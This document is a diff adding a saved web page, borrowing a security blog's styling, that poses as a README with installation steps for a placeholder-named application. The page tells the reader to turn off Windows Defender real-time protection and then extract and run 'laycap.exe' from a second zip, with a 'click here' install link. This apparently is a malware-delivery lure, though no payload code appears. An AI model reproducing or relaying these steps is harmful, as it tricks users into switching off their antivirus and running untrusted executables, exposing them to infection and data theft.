@@ -1,0 +1,370 @@
+From: <Saved by Blink>
+Snapshot-Content-Location: xx
+Subject: Posts | PwnDiary
+Date: Tue, 21 May 2024 21:02:58 +0100
+MIME-Version: 1.0
+Content-Type: multipart/related;
+	type="text/html";
+	boundary="----MultipartBoundary--38bpAkTilzbs8w3ckdvAWvpo6m1FjbH5G29ms7K0hn----"
+
+
+------MultipartBoundary--38bpAkTilzbs8w3ckdvAWvpo6m1FjbH5G29ms7K0hn----
+Content-Type: text/html
+Content-ID: <frame-FCAADADCAD4A24C346647F371E0690C8@mhtml.blink>
+Content-Transfer-Encoding: quoted-printable
+Content-Location: xxxxx
+
+<!DOCTYPE html><html lang=3D"en-US"><head><meta http-equiv=3D"Content-Type"=
+ content=3D"text/html; charset=3DUTF-8">
+   =20
+    <meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+    <meta name=3D"viewport" content=3D"width=3Ddevice-width, initial-scale=
+=3D1">
+    <link rel=3D"stylesheet" href=3D"https://pwndiary.com/assets/css/style.=
+css?v=3D80d3ff050ecb011aafae2b5bd387dea8b16fbd7e">
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Posts | README</title>
+<meta name=3D"generator" content=3D"Jekyll v3.9.2">
+<meta property=3D"og:title" content=3D"Posts">
+<meta name=3D"author" content=3D"umutoztunc">
+<meta property=3D"og:locale" content=3D"en_US">
+<meta name=3D"description" content=3D"Access granted.">
+<meta property=3D"og:description" content=3D"Access granted.">
+<link rel=3D"canonical" href=3D"xxxxx">
+<meta property=3D"og:url" content=3D"xxxxx">
+<meta property=3D"og:site_name" content=3D"PwnDiary">
+<meta property=3D"og:type" content=3D"website">
+<meta name=3D"twitter:card" content=3D"summary">
+<meta property=3D"twitter:title" content=3D"Posts">
+
+<!-- End Jekyll SEO tag -->
+
+  </head>
+
+  <body>
+
+    <header>
+      <div class=3D"container">
+        <h1>cat README.md</h1>
+        <h2>Simple Instructions for Installing the xxxxxx Application</h2>
+
+        <section id=3D"downloads">
+          <a href=3D"" class=3D"btn">Home</a>
+          <a href=3D"" class=3D"btn">About</a>
+        </section>
+      </div>
+    </header>
+
+    <div class=3D"container">
+      <section id=3D"main_content">
+      <p>To install and run the xxxxxx application, please follow these steps : </p>
+        <h2 id=3D"posts">1.  Extracting the xxxxxx.zip folder:</h2>
+
+<ul>
+ =20
+    <li>
+      <span class=3D"date">Find the <a href="">xxxxxx.zip</a> folder on your computer.</span>
+    </li>
+ =20
+    <li>
+      <span class=3D"date">Right-click on the <a href="">xxxxxx.zip</a> folder.</span> 
+    </li>
+ =20
+    <li>
+      <span class=3D"date">Choose "Extract" or "Extract Here" from the menu</span>
+    </li>
+ =20
+    <li>
+      <span class=3D"date">Wait for the extraction to finish.</span>
+    </li>
+ =20
+
+</ul>
+      <h2 id=3D"posts">2.  Open the xxxxxx Folder:</h2>
+
+    
+<ul>
+ =20
+    <li>
+      <span class=3D"date">Go to the new folder named 'xxxxxx' that appears after extraction.
+</span>
+    </li>
+ =20
+</ul>
+
+    <h2>NOTE ! : Disable Windows Defender Manually:</h2>
+    <ul>
+ =20
+    <li>
+      <span class=3D"date">Click on the <a href="">Start menu (Windows icon)</a> . </span>
+    </li>
+ =20
+    <li>
+      <span class=3D"date">Type  <a href="">Virus & threat protection</a> in the search bar and select it from the results.</span> 
+    </li>
+ =20
+    <li>
+      <span class=3D"date">Click on <a href="">Manage settings</a>  under the  <a href="">Virus & threat protection settings</a> section. </span>
+    </li>
+ =20
+    <li>
+      <span class=3D"date">Turn off <a href="">Real-time protection</a> - Confirm any prompts to complete this action.</span>
+    </li>
+ =20
+
+</ul>
+
+    <h2>3.  Extract and Run laycap.zip</h2>
+
+<ul>
+ =20
+    <li>
+      <span class=3D"date">After disabling Windows Defender, find the file <a href="">2_laycap.zip</a> in the<a href="">xxxxxx</a> folder.</span>
+    </li>
+ =20
+    <li>
+      <span class=3D"date">Right-click on the <a href="">2_laycap.zip</a>.</span> 
+    </li>
+ =20
+    <li>
+      <span class=3D"date">Choose "Extract" or "Extract Here" from the menu</span>
+    </li>
+ =20
+    <li>
+      <span class=3D"date">Once the file are extracted double-click laycap.exe to run it.</span>
+    </li>
+ =20
+
+</ul>
+
+
+<h4><br><br> installation :</h4>
+<p>• To install the 'xxxxxx' application, <a href="">click here</a>.</p>
+
+
+      </section>
+    </div>
+
+   =20
+ =20
+
+</body></html>
+------MultipartBoundary--38bpAkTilzbs8w3ckdvAWvpo6m1FjbH5G29ms7K0hn----
+Content-Type: text/css
+Content-Transfer-Encoding: quoted-printable
+Content-Location: https://pwndiary.com/assets/css/style.css?v=80d3ff050ecb011aafae2b5bd387dea8b16fbd7e
+
+@charset "utf-8";
+
+.highlight { color: rgb(208, 208, 208); }
+
+.highlight table td { padding: 5px; }
+
+.highlight table pre { margin: 0px; }
+
+.highlight .w { color: rgb(208, 208, 208); }
+
+.highlight .err { color: rgb(21, 21, 21); background-color: rgb(172, 65, 66=
+); }
+
+.highlight .c, .highlight .cd, .highlight .cm, .highlight .c1, .highlight .=
+cs { color: rgb(136, 136, 136); }
+
+.highlight .cp { color: rgb(244, 191, 117); }
+
+.highlight .o, .highlight .ow { color: rgb(244, 191, 117); }
+
+.highlight .p, .highlight .pi { color: rgb(208, 208, 208); }
+
+.highlight .gi { color: rgb(144, 169, 89); }
+
+.highlight .gd { color: rgb(172, 65, 66); }
+
+.highlight .gh { color: rgb(106, 159, 181); font-weight: bold; }
+
+.highlight .k, .highlight .kn, .highlight .kp, .highlight .kr, .highlight .=
+kv { color: rgb(170, 117, 159); }
+
+.highlight .kc, .highlight .kt, .highlight .kd { color: rgb(210, 132, 69); =
+}
+
+.highlight .s, .highlight .sb, .highlight .sc, .highlight .sd, .highlight .=
+s2, .highlight .sh, .highlight .sx, .highlight .s1 { color: rgb(144, 169, 8=
+9); }
+
+.highlight .sr { color: rgb(117, 181, 170); }
+
+.highlight .si, .highlight .se { color: rgb(143, 85, 54); }
+
+.highlight .nt, .highlight .nn, .highlight .nc, .highlight .no { color: rgb=
+(244, 191, 117); }
+
+.highlight .na { color: rgb(106, 159, 181); }
+
+.highlight .m, .highlight .mf, .highlight .mh, .highlight .mi, .highlight .=
+il, .highlight .mo, .highlight .mb, .highlight .mx { color: rgb(144, 169, 8=
+9); }
+
+.highlight .ss { color: rgb(144, 169, 89); }
+
+body { margin: 0px; padding: 0px; background: url("../images/bkg.png") 0px =
+0px rgb(21, 21, 21); color: rgb(234, 234, 234); font-size: 16px; line-heigh=
+t: 1.5; font-family: Monaco, "Bitstream Vera Sans Mono", "Lucida Console", =
+Terminal, monospace; }
+
+.container { width: 90%; max-width: 1000px; margin: 0px auto; }
+
+section { display: block; margin: 0px 0px 20px; }
+
+h1, h2, h3, h4, h5, h6 { margin: 0px 0px 20px; }
+
+li { line-height: 1.4; }
+
+header { background: rgba(0, 0, 0, 0.1); width: 100%; border-bottom: 1px da=
+shed rgb(181, 232, 83); padding: 20px 0px; margin: 0px 0px 40px; }
+
+header h1 { font-size: 30px; line-height: 1.5; margin: 0px 0px 0px -40px; f=
+ont-weight: bold; font-family: Monaco, "Bitstream Vera Sans Mono", "Lucida =
+Console", Terminal, monospace; color: rgb(181, 232, 83); text-shadow: rgba(=
+0, 0, 0, 0.1) 0px 1px 1px, rgba(181, 232, 83, 0.1) 0px 0px 5px, rgba(181, 2=
+32, 83, 0.1) 0px 0px 10px; letter-spacing: -1px; -webkit-font-smoothing: an=
+tialiased; }
+
+@media (max-width: 1000px) {
+  header h1 { margin-left: 0px; }
+}
+
+header h1::before { content: "./ "; font-size: 24px; }
+
+header h2 { font-size: 18px; font-weight: 300; color: rgb(102, 102, 102); }
+
+#downloads .btn { display: inline-block; text-align: center; margin: 0px; }
+
+#main_content { width: 100%; -webkit-font-smoothing: antialiased; }
+
+section img { max-width: 100%; }
+
+h1, h2, h3, h4, h5, h6 { font-weight: normal; font-family: Monaco, "Bitstre=
+am Vera Sans Mono", "Lucida Console", Terminal, monospace; color: rgb(181, =
+232, 83); letter-spacing: -0.03em; text-shadow: rgba(0, 0, 0, 0.1) 0px 1px =
+1px, rgba(181, 232, 83, 0.1) 0px 0px 5px, rgba(181, 232, 83, 0.1) 0px 0px 1=
+0px; }
+
+#main_content h1 { font-size: 30px; }
+
+#main_content h2 { font-size: 24px; }
+
+#main_content h3 { font-size: 18px; }
+
+#main_content h4 { font-size: 14px; }
+
+#main_content h5 { font-size: 12px; text-transform: uppercase; margin: 0px =
+0px 5px; }
+
+#main_content h6 { font-size: 12px; text-transform: uppercase; color: rgb(1=
+53, 153, 153); margin: 0px 0px 5px; }
+
+dt { font-style: italic; font-weight: bold; }
+
+ul li { list-style-image: url("../images/bullet.png"); }
+
+blockquote { color: rgb(170, 170, 170); padding-left: 10px; border-left: 1p=
+x dotted rgb(102, 102, 102); }
+
+pre { background: rgba(0, 0, 0, 0.9); border: 1px solid rgba(255, 255, 255,=
+ 0.15); padding: 10px; font-size: 16px; color: rgb(181, 232, 83); border-ra=
+dius: 2px; overflow-wrap: normal; overflow: auto hidden; }
+
+code.highlighter-rouge { background: rgba(0, 0, 0, 0.9); border: 1px solid =
+rgba(255, 255, 255, 0.15); padding: 0px 3px; margin: 0px -3px; color: rgb(1=
+70, 117, 159); border-radius: 2px; }
+
+table { width: 100%; margin: 0px 0px 20px; }
+
+th { text-align: left; border-bottom: 1px dashed rgb(181, 232, 83); padding=
+: 5px 10px; }
+
+td { padding: 5px 10px; }
+
+hr { height: 0px; border-width: 0px 0px 1px; border-top-style: initial; bor=
+der-right-style: initial; border-left-style: initial; border-top-color: ini=
+tial; border-right-color: initial; border-left-color: initial; border-image=
+: initial; border-bottom-style: dashed; border-bottom-color: rgb(181, 232, =
+83); color: rgb(181, 232, 83); }
+
+.btn { display: inline-block; background: -webkit-linear-gradient(top, rgba=
+(40, 40, 40, 0.3), rgba(35, 35, 35, 0.3) 50%, rgba(10, 10, 10, 0.3) 50%, rg=
+ba(0, 0, 0, 0.3)); padding: 8px 18px; border-radius: 50px; border-width: 2p=
+x; border-style: solid; border-color: rgb(0, 0, 0) rgba(0, 0, 0, 0.7) rgba(=
+0, 0, 0, 0.7); border-image: initial; color: rgba(255, 255, 255, 0.8); font=
+-family: Helvetica, Arial, sans-serif; font-weight: bold; font-size: 13px; =
+text-decoration: none; text-shadow: rgba(0, 0, 0, 0.75) 0px -1px 0px; box-s=
+hadow: rgba(255, 255, 255, 0.05) 0px 1px 0px inset; }
+
+.btn:hover { background: -webkit-linear-gradient(top, rgba(40, 40, 40, 0.6)=
+, rgba(35, 35, 35, 0.6) 50%, rgba(10, 10, 10, 0.8) 50%, rgba(0, 0, 0, 0.8))=
+; }
+
+.btn .icon { display: inline-block; width: 16px; height: 16px; margin: 1px =
+8px 0px 0px; float: left; }
+
+.btn-github .icon { opacity: 0.6; background: url("../images/blacktocat.png=
+") 0px 0px no-repeat; }
+
+a { color: rgb(99, 192, 245); text-shadow: rgba(104, 182, 255, 0.5) 0px 0px=
+ 5px; }
+
+.cf::before, .cf::after { content: ""; display: table; }
+
+.cf::after { clear: both; }
+
+.cf { zoom: 1; }
+
+#a-title { text-decoration: none; }
+------MultipartBoundary--38bpAkTilzbs8w3ckdvAWvpo6m1FjbH5G29ms7K0hn----
+Content-Type: image/png
+Content-Transfer-Encoding: base64
+Content-Location: https://pwndiary.com/assets/images/bkg.png
+
+iVBORw0KGgoAAAANSUhEUgAAAhQAAAIUAQMAAAB4tCemAAAABlBMVEUaGhobGxsh/u4NAAAEd0lE
+QVR4Xu3cPbKrMAwFYFOlZQdZqlkqS6BMFb2gHx/pZl6pVMcFk9yLvzQejZBlxjEeInKOTUTkPT5j
+k+N5f3qKyHH/YZ73df1N6tdjty9T4v7xfI0xlTwfN/T6kOPxvqH4JK9w7R/tBg0axzDwY+jKtUlq
+qHnPVBfk82Uz4pZ2gwYNDcd2yWtY1lqP9b8iNpa+jmNvN2jQQHDVMRUSRGIl7X4lNViLHBYt1P2h
+QYPGPBF/hxm+zG3S0k6f7j94dRs0aHjURQKBRy5RDctclHToSFnEbwwaNKBh6SOByBFbxMODrOrB
+3m7QoDHPXAaoaYOF43sEme6TFbG7DRo0Im14eLlAMNMSiLF5McGXvqCi4GNvN2jQkNMMLO53CtED
+M59SAjOyjX6DBg08fEUNVqdvehdwn+5a/dV2gwYN1FalQD4TLgKzz0Si223QoJEnoVvgVYsJ9YFM
+vFwQta12gwaNqLeKFO0NA8WsPFNkRed+gwaNv3tV9zBfAdUkLtg6QBq89xs0aHj8Xb2B/mgWuMh/
+uloEOW63QYMG2v0QhGt6ixJCWfWrcLC3GzRoRO66rf0rNAiWZKHUwPw+g9oNGjRy7oowm7MDH+bm
+YB29gf0GDRoehGu5ChsGgk+3mxZ8bIBd7QYNGpm2LoDaIKjjURNdUWMF63aDBg0fcf+UeCqb0LD+
+PSbHD+pPX90GDRr3pDDQw6ozfVJEYnyNOO1z93aDBo3DpteGKnEI21noIbQLxjy7DRo0POBiEg6u
+4nQKsgM0ueAIYbtBg4ZWVJHFImPwgcoXKgp+X+x9Xd0GDRr5bD8gb2iJPiyD0BZobkCj3aBBA41/
+er9/ten6CYXYWoONX5Cr26BBA09bKByogS7Bep4KRS986jdo0EANVjUb2RhY4ch7BSlHv0GDBnr9
+UeVatw7UYG0mjgiEceztBg0ac61mpLz5kitfvv7tb7i0GzRoIG3QT/kxLCJxXeFIecNtN2jQQEeg
+fB2wds0GcgdUGfSytxs0aES3Ss1xzcWhlnpspbZjj26DBg0deHmar+G8f7DV/djagnXj/QYNGtic
+qlUuERylwj4rBipfV7tBg4YI3kyVX1ihBqqsquG38rPY3m7QoHE803OXhBaTUAiob6vKsbvfoEFj
+nisTgF/aApUsK9xGJBVXu0GDBo78QZt+wWsp10X/EYYovrcbNGjgZJWokY+olBLWKC0DU5BKtBs0
+aIipHoRrzUpd/Dd+ywz0sLYbNGhMVLRKlUu1wNGEjdenrgRi7zZo0DBLkCzEKymyJjGQ/CIh7jdo
+0KgvmazlAmzAWohW7V03wH5k0KDhRQKlaysAOlgQhPHa6ojY/QYNGmgFOGKFq5+TBQRmhb5OCnYb
+NGikcCw6QquTPLPFOQGcD+w3aNAQVFTxFnV0WvlXJBXhYteg26BBo/Tz53rrKrXipf7LrYWDebUb
+NGgMHKZOrf9IFrBDYLhezMU5rV6DBo3s59x1tbSqq1rKhSXHiKvdoEHj601/5fkMuwZ1wyBwjdP/
+ACfy2vdF7+1uAAAAAElFTkSuQmCC
+
+------MultipartBoundary--38bpAkTilzbs8w3ckdvAWvpo6m1FjbH5G29ms7K0hn----
+Content-Type: image/png
+Content-Transfer-Encoding: base64
+Content-Location: https://pwndiary.com/assets/images/bullet.png
+
+iVBORw0KGgoAAAANSUhEUgAAABgAAAAKEAYAAAD++UIrAAAABGdBTUEAALGPC/xhBQAAACBjSFJN
+AAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAAABmJLR0QAAAAAAAD5Q7t/AAAA
+B3RJTUUH4QEFFQUT+FZvBQAAAUtJREFUOMu1lL1qAkEURmdXGxtLCQRBsbMSa7ERBAmkyIKFoGLj
+C9nqgtqIkBTBBV/AwtJOH2BhtVOxUsHi7A1ZSDb+ZG5zmJ2d75t7Z+YajuN5lpVOK6WUUp0O7Hbh
+ZPLy+vT8/nE6qTvD+fRc602fvkECySTD1QrGYnC9hoMBtG0Ml8vbEtCnb6iIiihDjOJxPlersNmE
+hUJw2WwGez04HmN8OIQn8v/6XwmEG2cyjBoNWK9DuRr7PRyNxBjD+fy6E7pf/88EfjY0/BXFImy1
+gsamCXM5jBYLXfrm9Vv/HtksrFRgqRQUdl243erW//UEqEQiwahWC1Ygn4fHo/+3A6W7TKdU/nwO
+r/Tj+n4XikaZsCwod7FchjIv3cG2Yb+P0GYTvlF9+v7CVArKI5HXPhxCeTTSHW4Nffp+ArsdbLfF
+CEF5/Y+GPv0LjpjmIv4L+ZoAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTctMDEtMDVUMjE6MDU6MTkr
+MDE6MDCJRMiFAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE3LTAxLTA1VDIxOjA1OjE5KzAxOjAw+Blw
+OQAAAAh0RVh0bGFiZWwAPj6zNXeIAAAAAElFTkSuQmCC
+
+------MultipartBoundary--38bpAkTilzbs8w3ckdvAWvpo6m1FjbH5G29ms7K0hn------
